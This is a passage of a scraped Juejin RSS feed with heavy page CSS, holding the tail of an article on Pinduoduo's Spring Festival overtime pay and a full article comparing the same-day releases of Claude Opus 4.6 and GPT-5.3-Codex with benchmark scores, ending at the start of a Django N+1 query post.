.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>距离过年假期越来越近了，说实话，这会坐在工位上有时候浑身刺挠，思绪不知不觉也会飘上一阵。</p>
<p>最近在网上刷到一个过年期间电商平台拼多多内部加班补贴曝光的帖子，相信不少同学也看到了，在职场社区里引发了一阵关注和热议。</p>
<p>具体内容是这样的：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36ce0297672e4d9dbb7b32e01c5a48e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29kZVNoZWVw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770943234&amp;x-signature=3lxm0OVo%2BxraXWcm5psP7y8a5DA%3D" alt="" loading="lazy"/></p>
<p>简单点来说：</p>
<ul>
<li>
<p>从除夕到初三这前四天，员工可获得当日工资 3 倍的报酬，其中不仅包括正常日薪，还额外增加了每日保底 400 元的补贴；</p>
</li>
<li>
<p>而从初四到初七这后四天，报酬调整为当日工资的 2 倍，当然同样包含正常日薪与每日保底 200 元的补贴。</p>
</li>
</ul>
<p>不知道大家有没有算过一笔账，以一个月薪 2w~3w 的员工为例（当然在拼多多实际比这高的比比皆是），平均日薪如果就粗略地按 1000 左右来算的话，如果他选择加满这 9 天班，仅法定节假日的三倍工资部分就已是一笔巨款。</p>
<p>简单一些粗略算算，即便不算上帖子里所说的什么补贴，就按除夕到初三这四天每天三倍工资以及初四到初七这四天每天两倍工资，那也有：</p>
<p>（3000×4）+（2000×4）+1000=21000</p>
<p>也就是说短短 9 天假期，两万多到手，这还不算帖子里所说的什么各种补贴或者其他激励，如果加上这些，实际收入还会更高。</p>
<p>这什么概念，这相当于大厂普通程序员工作一个月的薪资，但在这里仅用一周的时间就可以赚到。</p>
<p>这如果要是搁在许多其他行业，这或许是一个普通员工好几个月的全部收入了。</p>
<p>更引人注目的是，按帖子来说，拼多多在这次春节期间还取消了计件薪资的封顶限制，多劳多得，上不封顶。</p>
<p>当然，咱们上面这只是粗略算算，毕竟不同岗位，不同工种，不同员工的加班时间选择段也不一样，所以实际收入肯定是各有不同。</p>
<p>比如对于拼多多的研发岗程序员们来说，高 base 的员工那比比皆是，那这个春节加班报酬合下来更是非常可观了，比上面算的高一大截也再正常不过。</p>
<p>那作为行业内的后起之秀，拼多多如今已是一个拥有海量用户的电商平台，拼多多的系统需要 365 天无间断运行，即便是春节期间，各项电商业务对用户来说都需要可用，这些需求不会因为节假日而消失。</p>
<p>更重要的是，拼多多的国际版 Temu 也正在全球范围内迅猛扩张，无论是下载量还是月活数据都屡创新高，这些海外用户的购物需求在春节期间不会减少。</p>
<p>因此不光是拼多多，像这类电商平台公司，春节期间为了保证系统的稳定运行，都会安排专人值班。</p>
<p>而且拼多多的人效在电商行业中一直处于比较领先的水平，在这样的高效运营模式下，为关键岗位提供高额加班补贴，确保业务连续性和稳定性，这对于他们公司来说，其实是一种非常理性的商业投资，怎么算都是非常划算的。</p>
<p>前段时间，在网上不是有一个流传很广的那个《国内最难入职的 IT 公司排行》表格嘛，相信不少同学都看过，其中排在榜首的就是拼多多。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93013f302aef4d46a9c630296913a90a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29kZVNoZWVw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770943234&amp;x-signature=p8fGnraLuCYsh2WySs3MIr4Jigg%3D" alt="" loading="lazy"/></p>
<p>当然这个表格并非官方发布的，而是有网友根据校招面试的一些情况整理得出的，只能算是一个主观感受结果，并不能保证完全准确，大家可以参考感受一下。</p>
<p>大家知道拼多多素来都以快节奏、高压力和强执行所著称，其面试难度在互联网行业位居前列基本是没毛病的，尤其在技术研发岗和核心业务部门。</p>
<p>就拿技术岗来说，面过拼多多的同学都知道其算法与实战并重，题目难度可对标 LeetCode 中等到 Hard 级别，比如组合总数、动态规划等这类问题，而且需手写代码并优化时间复杂度。</p>
<p>另外拼多多对于工程实践能力也非常侧重，像什么高并发、数据库优化、分布式缓存一致性等等考查，在面试的时候基本都是家常便饭。</p>
<p>在拼多多虽然工作强度大，工作量多，但人家也是真的肯给钱。就像网友说的那样，只要回报和工作量能相匹配，那大家基本都还是可以接受的。</p>
<p>当然，还是那句话，每个人的想法不一样，每个人的选择也不一样，如果是你，面对高额的加班补贴 or 难得的假期生活，你会怎么选择呢？</p>
<blockquote>
<p>注：本文在GitHub开源仓库「编程之路」 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frd2coding%2FRoad2Coding" target="_blank" title="https://github.com/rd2coding/Road2Coding" ref="nofollow noopener noreferrer">github.com/rd2coding/R…</a> 中已经收录，里面有我整理的6大编程方向(岗位)的自学路线+知识点大梳理、面试考点、我的简历、几本硬核pdf笔记，以及程序员生活和感悟，欢迎star。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI 模型春晚来了，Opus 4.6 和 GPT5.3 同日登场，下一个会是谁呢？]]></title>    <link>https://juejin.cn/post/7603219519667535891</link>    <guid>https://juejin.cn/post/7603219519667535891</guid>    <pubDate>2026-02-06T00:52:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603219519667535891" data-draft-id="7603246733317275702" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI 模型春晚来了，Opus 4.6 和 GPT5.3 同日登场，下一个会是谁呢？"/> <meta itemprop="keywords" content="前端,后端,OpenAI"/> <meta itemprop="datePublished" content="2026-02-06T00:52:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Moment"/> <meta itemprop="url" content="https://juejin.cn/user/3782764966460398"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI 模型春晚来了，Opus 4.6 和 GPT5.3 同日登场，下一个会是谁呢？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3782764966460398/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Moment
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-06T00:52:10.000Z" title="Fri Feb 06 2026 00:52:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>今天凌晨，AI 圈突然发布了两个重磅消息，两者之间相差不到半个小时，那可真是 AI 春晚呐。Anthropic 和 OpenAI 这两家 AI 领域的头部公司，仿佛约好了一般，在同一个清晨向世界宣告：新一代大模型来了！</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31b40a8edbca422c818dc9ecc988b7b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770943930&amp;x-signature=7vQYjgr%2BrfU7SFbxh8rmws2CtZ4%3D" alt="20260206083225" loading="lazy"/></p>
<h2 data-id="heading-0">Claude Opus 4.6：更智能、更可靠、更强大</h2>
<p>首先登场的是 Anthropic 的 Claude Opus 4.6。根据官方介绍，这是他们"最智能的模型升级"。Opus 4.6 在三个关键维度实现了显著提升：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c03004b811824e7194a8e9ba4783a2b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770943930&amp;x-signature=Bt8PFKON3YLfcY0kMbXzXNNfdug%3D" alt="20260206083308" loading="lazy"/></p>
<ul>
<li><strong>更谨慎的规划</strong>：能够更长时间地保持专注，处理需要持续注意力的复杂任务</li>
<li><strong>大规模代码库的可靠性</strong>：在处理庞大代码库时表现更加稳定和可靠</li>
<li><strong>自我纠错能力</strong>：能够捕获并修正自己的错误，这是 AI 走向真正智能的重要一步</li>
</ul>
<p>更令人兴奋的是，Opus 4.6 成为了首个在测试阶段就拥有 <strong>1M token 上下文窗口</strong>的 Opus 级别模型。这意味着它可以一次性处理更长的文本、更大的代码库，极大地提升了实际应用中的效率。</p>
<h2 data-id="heading-1">OpenAI 火速跟进：GPT-5.3-Codex 强势登场</h2>
<p>Claude 发布不到半小时，OpenAI 就紧随其后发布了 GPT-5.3-Codex。这个节奏，让人不禁感叹：这场 AI 竞赛已经白热化了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07ed74e0b9d04b9983e053b182092d1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770943930&amp;x-signature=x3ZlkUwxBM%2BeRDzYsJRBEFdiUPQ%3D" alt="20260206083447" loading="lazy"/></p>
<p>GPT-5.3-Codex 现已在 Codex 平台上线，OpenAI 官方宣称："你可以直接用它来构建东西。"（You can just build things.）这种自信的表述背后，是他们对这个新模型能力的充分肯定。</p>
<h2 data-id="heading-2">数据不会说谎：谁更强？</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9568f6f536243658e5f22338476831d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770943930&amp;x-signature=UJAyFuWV5kKHbjFy%2FsPuEenecUQ%3D" alt="20260206083646" loading="lazy"/></p>
<p>从官方发布的性能对比图表来看，两个模型各有千秋：</p>
<h3 data-id="heading-3">主要测试结果对比</h3>
<p>在多项基准测试中，Opus 4.6 和 GPT-5.3-Codex 展开了激烈竞争：</p>
<ul>
<li><strong>Agentic terminal testing</strong>：Opus 4.6 以 65.4% 领先</li>
<li><strong>Agentic coding</strong>：Opus 4.6 80.8%，GPT-5.3-Codex 80.0%，几乎打平</li>
<li><strong>Agentic computer use</strong>：Opus 4.6 72.7% 占优</li>
<li><strong>Agentic tool use</strong> 和 <strong>Scaled tool use</strong>：Opus 4.6 继续领先</li>
</ul>
<h3 data-id="heading-4">专业领域测试</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/616345cd701148cabed9c924a1413e54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770943930&amp;x-signature=%2BcqezdFmJlMQSFu%2B64M0boGAfe4%3D" alt="20260206083521" loading="lazy"/></p>
<p>在更多专业领域的测试中：</p>
<ul>
<li><strong>Office tasks</strong>：GPT-5.3-Codex 以 1463 分领先</li>
<li><strong>Multidisciplinary reasoning</strong>：Opus 4.6 在多个维度表现更优</li>
<li><strong>Multilingual Q&amp;A</strong>：Opus 4.6 91.1% vs GPT-5.3-Codex 89.6%</li>
<li><strong>Visual reasoning</strong>：两者都超过 77%，表现优异</li>
</ul>
<h2 data-id="heading-5">编码能力的巅峰对决</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9dc5cbb5bd9453395f3d8799eb8bb8e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770943930&amp;x-signature=4sTaNInO2JJv7apF8imQxqH8Pqw%3D" alt="20260206083605" loading="lazy"/></p>
<p>特别值得关注的是编码能力测试。在 Terminal-Bench 2.0 这个备受关注的编码基准测试中：</p>
<ul>
<li><strong>GPT-5.3-Codex (high)</strong>: 77.3%</li>
<li><strong>GPT-5.2-Codex (high)</strong>: 64.0%</li>
<li><strong>GPT-5.2 (high)</strong>: 62.2%</li>
</ul>
<p>而在 SWE-Bench Pro 公开测试中：</p>
<ul>
<li><strong>GPT-5.3-Codex (high)</strong>: 56.8%</li>
<li><strong>GPT-5.2-Codex (high)</strong>: 56.4%</li>
<li><strong>GPT-5.2 (high)</strong>: 55.6%</li>
</ul>
<p>这些数据显示，GPT-5.3-Codex 在编码任务上确实有显著提升，尤其是在 Terminal-Bench 2.0 上取得了突破性的 77.3% 得分。</p>
<h2 data-id="heading-6">AI 军备竞赛：谁是真正的赢家？</h2>
<p>有网友制作了一张讽刺图，展示了 OpenAI、Grok、Gemini 和其他 AI 公司都在循环宣称自己推出了"世界上最强大的模型"。这种现象背后，反映的是 AI 行业竞争的激烈程度。</p>
<p>但从用户角度来看，这种竞争无疑是好事：</p>
<ol>
<li><strong>技术快速迭代</strong>：模型能力以肉眼可见的速度提升</li>
<li><strong>价格更加亲民</strong>：竞争促使各家优化成本</li>
<li><strong>应用场景扩展</strong>：更强的能力意味着更多可能性</li>
<li><strong>开发者受益</strong>：更好的工具，更高的生产力</li>
</ol>
<h2 data-id="heading-7">结语：AI 的黄金时代才刚刚开始</h2>
<p>从凌晨的"双响炮"可以看出，AI 大模型的竞赛已经进入了分秒必争的阶段。Anthropic 和 OpenAI 的同时发布，既是巧合，也是必然——在这个技术爆炸的时代，谁也不想落后半步。</p>
<p>对于开发者和用户而言，这是最好的时代。我们不必纠结于谁是"最强"，因为在激烈的竞争中，每一家都在全力以赴地推动技术进步。Claude Opus 4.6 的 1M token 上下文、更强的自我纠错能力，GPT-5.3-Codex 在编码任务上的突破，都是实打实的能力提升。</p>
<p>AI 模型的春晚才刚刚开始，2026 年注定是精彩纷呈的一年。让我们拭目以待，看看接下来还会有哪些惊喜。</p>
<p><strong>你更看好哪个模型？欢迎在评论区分享你的看法！</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[django n+1查询问题优化指南]]></title>    <link>https://juejin.cn/post/7603195960255496192</link>    <guid>https://juejin.cn/post/7603195960255496192</guid>    <pubDate>2026-02-06T01:02:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603195960255496192" 